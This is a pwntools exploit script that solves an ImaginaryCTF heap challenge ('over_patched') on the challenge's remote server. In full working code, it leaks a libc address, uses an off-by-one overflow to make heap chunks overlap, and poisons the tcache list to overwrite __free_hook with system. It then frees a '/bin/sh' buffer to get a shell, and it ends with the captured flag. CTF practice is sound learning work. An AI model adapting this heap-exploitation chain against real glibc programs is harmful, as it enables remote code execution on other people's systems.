from pwn import *

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
# io = gdb.debug("./over_patched", "c")
io = remote("chal.imaginaryctf.org", 42081)


def malloc(idx, size):
    io.sendlineafter(b"(choice) > ", b"1")
    io.sendlineafter(b"(idx) > ", str(idx).encode())
    io.sendlineafter(b"(size) > ", str(size).encode())


def free(idx):
    io.sendlineafter(b"(choice) > ", b"2")
    io.sendlineafter(b"(idx) > ", str(idx).encode())


def write(idx, b):
    io.sendlineafter(b"(choice) > ", b"3")
    io.sendlineafter(b"(idx) > ", str(idx).encode())
    io.sendafter(b"(content) > ", b)


def read(idx):
    io.sendlineafter(b"(choice) > ", b"4")
    io.sendlineafter(b"(idx) > ", str(idx).encode())
    io.recvn(0x70)  # drop garbage


# leak libc
malloc(0, 0x500)
malloc(1, 0x10)
free(0)
malloc(0, 0x500)
read(0)
libc_base = int.from_bytes(io.recvn(6), "little") - 0x1EBBE0
print(f"{libc_base = :#x}")

__free_hook = libc_base + 0x1EEB28
system = libc_base + 0x55410

# off by one to overlap
malloc(0, 0x18)
malloc(1, 0x18)
write(0, b"a" * (0x18 + 1))
# now chunk 1 size == 0x60
free(1)
malloc(1, 0x50)  # sizes[1] == 0x50
malloc(2, 0x40)
# now mem[1] + 0x20 == mem[2]

# construct tcache list on 0x50 bin
malloc(3, 0x40)
malloc(4, 0x10)
free(3)
free(2)

# overwrite fd
write(1, b"a" * 0x20 + p64(__free_hook) + b"\n")
malloc(2, 0x40)
malloc(3, 0x40)  # __free_hook

# free("/bin/sh")
write(2, b"/bin/sh\0\n")
write(3, p64(system) + b"\n")
free(2)

io.interactive()

# ictf{3v3n_a_on3_byt3_ov3rflow_can_b3_3xploit3d_d18e4f19}
